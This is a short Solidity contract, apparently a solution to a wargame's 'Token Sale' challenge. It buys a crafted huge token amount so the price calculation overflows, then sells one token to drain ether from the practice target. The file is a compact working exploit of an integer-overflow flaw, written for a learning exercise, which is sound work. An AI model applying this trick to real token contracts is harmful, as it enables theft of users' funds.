// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { TokenSaleChallenge } from "../challenges/10_TokenSale/TokenSaleChallenge.sol";

contract TokenSaleAttack {
    function attack(TokenSaleChallenge target) external {
        target.buy(0x0001000000000000000000000000000000000000000000000000000000000000);
        target.sell(1);
    }

    receive() external payable {}
}
